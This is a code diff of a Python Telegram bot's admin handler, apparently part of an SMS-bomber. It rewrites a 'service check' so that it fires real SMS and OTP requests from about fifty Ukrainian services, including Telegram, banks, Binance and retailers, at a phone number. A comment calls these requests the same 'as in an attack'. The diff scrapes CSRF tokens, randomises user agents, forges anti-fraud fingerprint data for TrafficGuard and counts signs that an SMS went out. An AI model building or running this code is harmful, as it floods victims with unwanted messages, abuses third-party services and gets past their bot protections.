@@ -898,64 +898,136 @@ async def admin_check_services(message: Message):
     
     placeholder = await message.answer("Перевіряю сервіси…")
     
-    # Список всіх сервісів з URL для перевірки
+    # Тестовий номер для перевірки
+    test_number = "380969999999"
+    formatted_number = f"+{test_number[:2]} {test_number[2:5]} {test_number[5:8]} {test_number[8:10]} {test_number[10:]}"
+    formatted_number2 = f"+{test_number[:2]}+({test_number[2:5]})+{test_number[5:8]}+{test_number[8:10]}+{test_number[10:]}"
+    formatted_number3 = f"+{test_number[:2]}+({test_number[2:5]})+{test_number[5:8]}+{test_number[8:]}"
+    formatted_number4 = f"+{test_number[:2]}({test_number[2:5]}){test_number[5:8]}-{test_number[8:10]}-{test_number[10:]}"
+    formatted_number5 = f"+{test_number[:3]}({test_number[3:6]}){test_number[6:9]}-{test_number[9:11]}-{test_number[11:]}"
+    formatted_number6 = f"+{test_number[:3]}({test_number[3:5]}){test_number[5:8]}-{test_number[8:10]}-{test_number[10:]}"
+    formatted_number7 = f"+{test_number[:3]}({test_number[3:6]}) {test_number[6:9]}-{test_number[9:11]}-{test_number[11:]}"
+    formatted_number9 = f"+{test_number[:2]} ({test_number[2:5]}) {test_number[5:8]}-{test_number[8:10]}-{test_number[10:]}"
+    
+    headers = {"User-Agent": fake_useragent.UserAgent().random}
+    
+    # Отримуємо CSRF токени та інші необхідні дані
+    csrf_url = "https://auto.ria.com/iframe-ria-login/registration/2/4"
+    csrf_token = None
+    try:
+        csrf_token = await get_csrf_token(csrf_url, headers=headers)
+    except Exception:
+        pass
+    
+    finbert_csrf_token = None
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get("https://finbert.ua/auth/register/", headers=headers_finbert, cookies=cookies_finbert) as response:
+                html = await response.text()
+                soup = BeautifulSoup(html, "html.parser")
+                csrf_input = soup.find("input", {"name": "csrfmiddlewaretoken"})
+                if csrf_input:
+                    finbert_csrf_token = csrf_input.get("value")
+    except Exception:
+        pass
+    
+    brabrabra_sessid = None
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get("https://brabrabra.ua/auth/modal.php?login=yes&ajax_mode=Y", headers=headers_brabrabra, cookies=cookies_brabrabra) as response:
+                html = await response.text()
+                soup = BeautifulSoup(html, "html.parser")
+                sessid_input = soup.find("input", {"name": "sessid"})
+                if sessid_input:
+                    brabrabra_sessid = sessid_input.get("value")
+                else:
+                    brabrabra_sessid = cookies_brabrabra.get("PHPSESSID", "")
+    except Exception:
+        brabrabra_sessid = cookies_brabrabra.get("PHPSESSID", "")
+    
+    # Генеруємо дані для TrafficGuard
+    trafficguard_sid = str(uuid.uuid4())
+    trafficguard_psi = str(uuid.uuid4())
+    trafficguard_pc = str(uuid.uuid4())
+    trafficguard_ciid = str(uuid.uuid4())
+    trafficguard_timestamp = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"
+    trafficguard_timestamp_u = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%SZ")
+    current_timestamp = int(datetime.utcnow().timestamp() * 1000)
+    lksd_data = {"s": trafficguard_sid, "st": current_timestamp, "sod": "duckduckgo.com", "sodt": current_timestamp, "sods": "r", "sodst": current_timestamp}
+    trafficguard_lksd = base64.b64encode(json.dumps(lksd_data).encode()).decode()
+    ga_client_id = f"GA1.3.{random.randint(1000000000, 9999999999)}.{current_timestamp // 1000}"
+    gid_client_id = f"GA1.3.{random.randint(1000000000, 9999999999)}.{current_timestamp // 1000}"
+    ga4_client_id = f"GS2.3.s{current_timestamp}$o1$g1$t{current_timestamp}$j{random.randint(10, 99)}$l0$h0"
+    cd_data = {"_ga": ga_client_id, "_gid": gid_client_id, "_ga_3X15VBC9L9": ga4_client_id}
+    trafficguard_cd = base64.b64encode(json.dumps(cd_data).encode()).decode()
+    lpd_data = {"landing_page_url": "https://rozetka.com.ua/", "landing_page_title": "Інтернет-магазин ROZETKA™", "landing_page_referrer": "https://duckduckgo.com"}
+    trafficguard_lpd = base64.b64encode(json.dumps(lpd_data).encode()).decode()
+    device_info_dict = {"screen_resolution": "800,1800", "available_screen_resolution": "800,1800", "system_version": "Windows 10", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0", "canvas_code": "9f305daa", "audio": "35.749972093850374"}
+    trafficguard_device_info = base64.b64encode(json.dumps(device_info_dict).encode()).decode()
+    bf_string = f"{device_info_dict.get('user_agent', '')}{device_info_dict.get('screen_resolution', '')}{device_info_dict.get('canvas_code', '')}{device_info_dict.get('audio', '')}"
+    trafficguard_bf = hashlib.md5(bf_string.encode()).hexdigest()
+    
+    monto_device_id = str(uuid.uuid4())
+    monto_fingerprint = monto_device_id
+    
+    # Список всіх сервісів для перевірки
     services_to_check = [
-        ("База даних", "db_check", None),
-        ("Проксі", "proxy_check", None),
-        ("Бот", "bot_check", None),
-        ("Telegram", "https://my.telegram.org", None),
-        ("Helsi", "https://helsi.me", None),
-        ("Multiplex", "https://auth.multiplex.ua", None),
-        ("PizzaDay", "https://api.pizzaday.ua", None),
-        ("StationPizza", "https://stationpizza.com.ua", None),
-        ("TakeUseat", "https://core.takeuseat.in.ua", None),
-        ("Aurum", "https://aurum.in.ua", None),
-        ("PizzaTime", "https://pizza-time.eatery.club", None),
-        ("IQ-Pizza", "https://iq-pizza.eatery.club", None),
-        ("Дніпро", "https://dnipro-m.ua", None),
-        ("Citrus", "https://my.ctrs.com.ua", None),
-        ("EasyPay", "https://auth.easypay.ua", None),
-        ("Sandalini", "https://sandalini.ua", None),
-        ("UVape", "https://uvape.pro", None),
-        ("VandalVape", "https://vandalvape.life", None),
-        ("TerraVape", "https://terra-vape.com.ua", None),
-        ("Comfy", "https://im.comfy.ua", None),
-        ("Moyo", "https://www.moyo.ua", None),
-        ("Pizza Od", "https://pizza.od.ua", None),
-        ("Sushiya", "https://sushiya.ua", None),
-        ("Avrora", "https://avrora.ua", None),
-        ("Золота Країна", "https://zolotakraina.ua", None),
-        ("AutoRia", "https://auto.ria.com", None),
-        ("Ukrpas", "https://ukrpas.ua", None),
-        ("Maslotom", "https://maslotom.com", None),
-        ("Varus", "https://varus.ua", None),
-        ("GetVape", "https://getvape.com.ua", None),
-        ("IQOS", "https://api.iqos.com.ua", None),
-        ("LvivKholod", "https://llty-api.lvivkholod.com", None),
-        ("PlanetaKino", "https://api-mobile.planetakino.ua", None),
-        ("Trofim", "https://back.trofim.com.ua", None),
-        ("Robota", "https://dracula.robota.ua", None),
-        ("Kyivstar", "https://shop.kyivstar.ua", None),
-        ("Elmir", "https://elmir.ua", None),
-        ("Bars", "https://bars.itbi.com.ua", None),
-        ("Kolomarket", "https://api.kolomarket.abmloyalty.app", None),
-        ("Apteka24", "https://ucb.z.apteka24.ua", None),
-        ("Ta-Da", "https://api.ta-da.net.ua", None),
-        ("Monto", "https://mobilebanking.monto.com.ua", None),
-        ("SmartMedical", "https://smartmedicalcenter.ua", None),
-        ("Silpo", "https://auth.silpo.ua", None),
-        ("GoodWine", "https://goodwine.com.ua", None),
-        ("Brabrabra", "https://brabrabra.ua", None),
-        ("Finbert", "https://finbert.ua", None),
-        ("Work.ua", "https://www.work.ua", None),
-        ("Binance", "https://accounts.binance.com", None),
-        ("TrafficGuard", "https://api.trafficguard.ai", None),
-        ("Oschadbank", "https://c2c.oschadbank.ua", None),
-        ("Prosto", "https://api.prosto.net", None),
+        ("База даних", "db_check", None, None),
+        ("Проксі", "proxy_check", None, None),
+        ("Бот", "bot_check", None, None),
+        ("Telegram", "https://my.telegram.org/auth/send_password", {"data": {"phone": "+" + test_number}, "headers": headers}, None),
+        ("Helsi", "https://helsi.me/api/healthy/v2/accounts/login", {"json": {"phone": test_number, "platform": "PISWeb"}, "headers": headers}, None),
+        ("Multiplex", "https://auth.multiplex.ua/login", {"json": {"login": "+" + test_number}, "headers": headers}, None),
+        ("PizzaDay", "https://api.pizzaday.ua/api/V1/user/sendCode", {"json": {"applicationSend": "sms", "lang": "uk", "phone": test_number}, "headers": headers}, None),
+        ("StationPizza", "https://stationpizza.com.ua/api/v1/auth/phone-auth", {"json": {"needSubscribeForNews": "false", "phone": formatted_number}, "headers": headers}, None),
+        ("TakeUseat", "https://core.takeuseat.in.ua/auth/user/requestSMSVerification", {"json": {"phone": "+" + test_number}, "headers": headers}, None),
+        ("Aurum", "https://aurum.in.ua/local/ajax/authorize.php?lang=ua", {"json": {"phone": formatted_number, "type": ""}, "headers": headers}, None),
+        ("PizzaTime", "https://pizza-time.eatery.club/site/v1/pre-login", {"json": {"phone": test_number}, "headers": headers}, None),
+        ("IQ-Pizza", "https://iq-pizza.eatery.club/site/v1/pre-login", {"json": {"phone": test_number}, "headers": headers}, None),
+        ("Дніпро", "https://dnipro-m.ua/ru/phone-verification/", {"json": {"phone": test_number}, "headers": headers_dnipro, "cookies": cookies_dnipro}, None),
+        ("Citrus", "https://my.ctrs.com.ua/api/auth/login", {"json": {"identity": "+" + test_number}, "headers": headers_citrus, "cookies": cookies_citrus}, None),
+        ("EasyPay", "https://auth.easypay.ua/api/check", {"json": {"phone": test_number}, "headers": headers_easypay}, None),
+        ("Sandalini", "https://sandalini.ua/ru/signup/", {"data": {"data[firstname]": "деня", "data[phone]": formatted_number2, "wa_json_mode": "1", "need_redirects  ": "1", "contact_type": "person"}, "headers": headers}, None),
+        ("UVape", "https://uvape.pro/index.php?route=account/register/add", {"data": {"firstname": "деня", "telephone": formatted_number3, "email": "random@gmail.com", "password": "VHHsq6b#v.q>]Fk"}, "headers": headers_uvape, "cookies": cookies_uvape}, None),
+        ("VandalVape", "https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", {"data": {"phone": formatted_number4, "only_sms": "1"}, "headers": headers}, None),
+        ("TerraVape", "https://terra-vape.com.ua/index.php?route=common/modal_register/register_validate", {"data": {"firstname": "деня", "lastname": "деневич", "email": "randi@gmail.com", "telephone": test_number, "password": "password24-", "smscode": "", "step": "first_step"}, "headers": headers_terravape, "cookies": cookies_terravape}, None),
+        ("Comfy", "https://im.comfy.ua/api/auth/v3/otp/send", {"json": {"phone": test_number}, "headers": headers}, None),
+        ("Moyo", "https://www.moyo.ua/identity/registration", {"data": {"firstname": "деня", "phone": formatted_number5, "email": "rando@gmail.com"}, "headers": headers_moyo, "cookies": cookies_moyo}, None),
+        ("Pizza Od", "https://pizza.od.ua/ajax/reg.php", {"data": {"phone": formatted_number4}, "headers": headers}, None),
+        ("Sushiya", "https://sushiya.ua/ru/api/v1/user/auth", {"data": {"phone": test_number[2:], "need_skeep": ""}, "headers": headers_sushiya}, None),
+        ("Avrora", "https://avrora.ua/index.php?dispatch=otp.send", {"data": {"phone": formatted_number6, "security_hash": "0dc890802de67228597af47d95a7f52b", "is_ajax": "1"}, "headers": headers}, None),
+        ("Золота Країна", "https://zolotakraina.ua/ua/turbosms/verification/code", {"data": {"telephone": test_number, "email": "rando@gmail.com", "form_key": "PKRxVkPlQqBlb8Wi"}, "headers": headers_zolota, "cookies": cookies_zolota}, None),
+        ("AutoRia", "https://auto.ria.com/iframe-ria-login/registration/2/4", {"data": {"_csrf": csrf_token or "", "RegistrationForm[email]": f"{test_number}", "RegistrationForm[name]": "деня", "RegistrationForm[second_name]": "деневич", "RegistrationForm[agree]": "1", "RegistrationForm[need_sms]": "1"}, "headers": headers_avtoria, "cookies": cookies_avtoria}, None),
+        ("Ukrpas", f"https://ukrpas.ua/login?phone=+{test_number}", {"method": 'GET', "headers": headers}, None),
+        ("Maslotom", "https://maslotom.com/api/index.php?route=api/account/phoneLogin", {"data": {"phone": formatted_number6}, "headers": headers}, None),
+        ("Varus", "https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua", {"json": {"phone": "+" + test_number}, "headers": headers}, None),
+        ("GetVape", "https://getvape.com.ua/index.php?route=extension/module/regsms/sendcode", {"data": {"telephone": formatted_number7}, "headers": headers}, None),
+        ("IQOS", "https://api.iqos.com.ua/v1/auth/otp", {"json": {"phone": test_number}, "headers": headers}, None),
+        ("LvivKholod", f"https://llty-api.lvivkholod.com/api/client/{test_number}", {"method": 'POST', "headers": headers}, None),
+        ("PlanetaKino", "https://api-mobile.planetakino.ua/graphql", {"json": {"query": "mutation customerVerifyByPhone($phone: String!) { customerVerifyByPhone(phone: $phone) { isRegistered }}", "variables": {"phone": "+" + test_number}}, "headers": headers}, None),
+        ("Trofim", "https://back.trofim.com.ua/api/via-phone-number", {"json": {"phone": test_number}, "headers": headers}, None),
+        ("Robota", "https://dracula.robota.ua/?q=SendOtpCode", {"json": {"operationName": "SendOtpCode", "query": "mutation SendOtpCode($phone: String!) {  users {    login {      otpLogin {        sendConfirmation(phone: $phone) {          status          remainingAttempts          __typename        }        __typename      }      __typename    }    __typename  }}", "variables": {"phone": test_number}}, "headers": headers}, None),
+        ("Kyivstar", f"https://shop.kyivstar.ua/api/v2/otp_login/send/{test_number[2:]}", {"method": 'GET', "headers": headers}, None),
+        ("Elmir", "https://elmir.ua/response/load_json.php?type=validate_phone", {"data": {"fields[phone]": "+" + test_number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "code"}, "headers": headers_elmir, "cookies": cookies_elmir}, None),
+        ("Bars", f"https://bars.itbi.com.ua/smart-cards-api/common/users/otp?lang=uk&phone={test_number}", {"method": 'GET', "headers": headers}, None),
+        ("Kolomarket", "https://api.kolomarket.abmloyalty.app/v2.1/client/registration", {"json": {"phone": test_number, "password": "!EsRP2S-$s?DjT@", "token": "null"}, "headers": headers}, None),
+        ("Apteka24", "https://ucb.z.apteka24.ua/api/send/otp", {"json": {"phone": test_number}, "headers": headers_apteka24}, None),
+        ("Ta-Da", "https://api.ta-da.net.ua/v1.1/mobile/user.auth", {"json": {"phone": formatted_number9}, "headers": headers_ta_da}, None),
+        ("Monto", "https://mobilebanking.monto.com.ua/api-web/v1/authorization", {"json": {"form_id": "get_login", "login": test_number}, "headers": {**headers_monto, "device_id": monto_device_id, "fingerprint": monto_fingerprint}, "cookies": cookies_monto}, None),
+        ("SmartMedical", "https://smartmedicalcenter.ua/health/", {"data": {"auth_login": test_number[2:], "auth_password": "1234567890"}, "headers": headers_smartmedical, "cookies": cookies_smartmedical}, None),
+        ("Silpo", "https://auth.silpo.ua/api/v2/Login/ByPhone?returnUrl=/connect/authorize/callback?client_id=silpo--site--spa&redirect_uri=https%3A%2F%2Fsilpo.ua%2Fsignin-callback-angular.html&response_type=code&scope=public-my%20openid&nonce=62467d1da847556567d91332155e1a20f91fX8X6q&state=7a1776bee43ba28c3ab79191a4e54a4c55ll8naMu&code_challenge=V5cFVVx4xON-EYdzjheeqM2l1K5KUnQ4dDXJ5ROU58Y&code_challenge_method=S256", {"json": {"delivery_method": "sms", "phone": "+" + test_number, "phoneChannelType": 0, "recaptcha": None}, "headers": headers_silpo}, None),
+        ("GoodWine", "https://goodwine.com.ua/ua/auth/code/send", {"json": {"username": "+" + test_number}, "headers": headers_goodwine}, None),
+        ("Brabrabra", "https://brabrabra.ua/auth/modal.php?login=yes&ajax_mode=Y", {"data": {"sessid": brabrabra_sessid or "", "step": "1", "phone": formatted_number9, "ajax_mode": "Y"}, "headers": headers_brabrabra, "cookies": cookies_brabrabra}, None),
+        ("Finbert", "https://finbert.ua/auth/register/", {"data": {"csrfmiddlewaretoken": finbert_csrf_token or "", "phone": "+" + test_number, "cf-turnstile-response": ""}, "headers": headers_finbert, "cookies": cookies_finbert}, None),
+        ("Work.ua", "https://www.work.ua/api/v3/jobseeker/auth/", {"json": {"login": formatted_number}, "headers": headers_workua, "cookies": cookies_workua}, None),
+        ("Binance", "https://accounts.binance.com/bapi/accounts/v1/public/account/security/request/precheck", {"json": {"bizType": "login", "callingCode": "380", "mobile": test_number[3:], "mobileCode": "UA"}, "headers": headers_binance, "cookies": cookies_binance}, None),
+        ("TrafficGuard", "https://api.trafficguard.ai/tg-g-017014-001/api/v4/client-side/validate/event", {"data": {"pgid": "tg-g-017014-001", "sid": trafficguard_sid, "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0", "hr": "https://duckduckgo.com/", "pd": "{'name':'javascript_tag','version':'2.10.10'}", "psi": trafficguard_psi, "fpj": "true", "pvc": "1", "e": "registration", "et": trafficguard_timestamp, "etu": trafficguard_timestamp_u, "ep": '{"tag":"tg_68e3b20662f40"}', "tag": "tg_68e3b20662f40", "bua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0", "buad": "{}", "bw": "false", "bl": "uk-UA", "bcd": "24", "bdm": "not available", "bpr": "2", "bhc": "4", "bsr": "900,1800", "bto": "0", "bt": "Atlantic/Reykjavik", "bss": "true", "bls": "true", "bid": "true", "bod": "false", "bcc": "not available", "bnp": "Win32", "bdnt": "unspecified", "babk": "false", "bts": "10, false, false", "bf": trafficguard_bf, "s": "duckduckgo.com", "c": "", "p": "", "crt": "", "c2": "", "k": "", "sei": "", "t": "", "ti": "", "usid": "", "s3": "", "a": "", "csid": "", "pidi": "", "s2": "", "a2": "", "a4": "", "a3": "", "g": "", "wh": "rozetka.com.ua", "wp": "/", "wt": "Інтернет-магазин ROZETKA™", "wu": "https://rozetka.com.ua/", "bipe": "false", "bih": "false", "sis": "", "pci": "", "event_revenue_usd": "", "isc": "", "gid": "", "csi": "javascript_tag", "gc": "", "msclkid": "", "tgclid": "", "tgsid": "", "fbclid": "", "irclid": "", "dcclid": "", "gclsrc": "", "gbraid": "", "wbraid": "", "gac": "", "sipa": "eyJpZCI6ImpzIiwic2MiOiJnZW5lcmF0ZWQifQ==", "sila": "r", "if": "false", "pc": trafficguard_pc, "lksd": trafficguard_lksd, "cd": trafficguard_cd, "cpr": "true", "ciid": trafficguard_ciid, "fuid": "", "fbpxid": "480863978968397", "tid": "", "lpd": trafficguard_lpd, "stpes": "false", "udo": "e30="}, "headers": headers_trafficguard}, None),
+        ("Oschadbank", f"https://c2c.oschadbank.ua/api/sms/{test_number}", {"method": 'GET', "headers": headers}, None),
+        ("Prosto", f"https://api.prosto.net/v2/verify?type=intl_phone&value={test_number}", {"method": 'GET', "headers": headers}, None),
     ]
     
-    async def check_service_status(name, url_or_type, headers):
-        """Перевіряє статус сервісу"""
+    async def check_service_status(name, url_or_type, request_params, custom_headers):
+        """Перевіряє статус сервісу через тестовий запит"""
         if url_or_type == "db_check":
             try:
                 async with db_pool.acquire() as conn:
@@ -980,26 +1052,49 @@ async def admin_check_services(message: Message):
             except Exception:
                 return "❌"
         else:
-            # Перевірка HTTP сервісу
+            # Виконуємо тестовий запит як при атаці
             try:
-                timeout = aiohttp.ClientTimeout(total=3)
+                timeout = aiohttp.ClientTimeout(total=5)
                 async with aiohttp.ClientSession(timeout=timeout) as session:
-                    async with session.get(url_or_type, headers=headers or {}, allow_redirects=True) as response:
-                        if response.status < 500:
-                            return "✅"
-                        else:
+                    method = request_params.get('method', 'POST')
+                    hdrs = request_params.get('headers', {})
+                    hdrs['Accept-Encoding'] = 'gzip, deflate'
+                    
+                    kwargs = {k: v for k, v in request_params.items() if k != 'method' and k != 'headers'}
+                    kwargs['headers'] = hdrs
+                    
+                    async with session.request(method, url_or_type, **kwargs) as response:
+                        response_text = ""
+                        try:
+                            response_text = await response.text()
+                        except Exception:
+                            pass
+                        
+                        # Перевіряємо статус та відповідь
+                        if response.status in [200, 201, 202]:
+                            # Перевіряємо чи відповідь містить ознаки успішної відправки SMS
+                            sms_sent_indicators = ['sent', 'success', 'ок', 'успішно', 'sms', 'code sent', 'отправлено', 'отправлен', 'code', 'sms code', 'verification', 'подтверждение', 'підтвердження', 'отримано', 'получено', 'true', '"status"', '"success"', '"ok"', '"message"', '"result"']
+                            response_lower = response_text.lower()
+                            sms_confirmed = any(indicator in response_lower for indicator in sms_sent_indicators)
+                            
+                            if sms_confirmed or response.status == 200:
+                                return "✅"
+                            else:
+                                return "⚠️"
+                        elif response.status < 500:
                             return "⚠️"
+                        else:
+                            return "❌"
             except asyncio.TimeoutError:
                 return "⏱️"
-            except Exception:
+            except Exception as e:
                 return "❌"
     
     # Перевіряємо всі сервіси паралельно
-    headers = {"User-Agent": fake_useragent.UserAgent().random}
     tasks = []
     service_names = []
-    for name, url_or_type, custom_headers in services_to_check:
-        task = check_service_status(name, url_or_type, custom_headers or headers)
+    for name, url_or_type, request_params, custom_headers in services_to_check:
+        task = check_service_status(name, url_or_type, request_params, custom_headers)
         tasks.append(task)
         service_names.append(name)
     
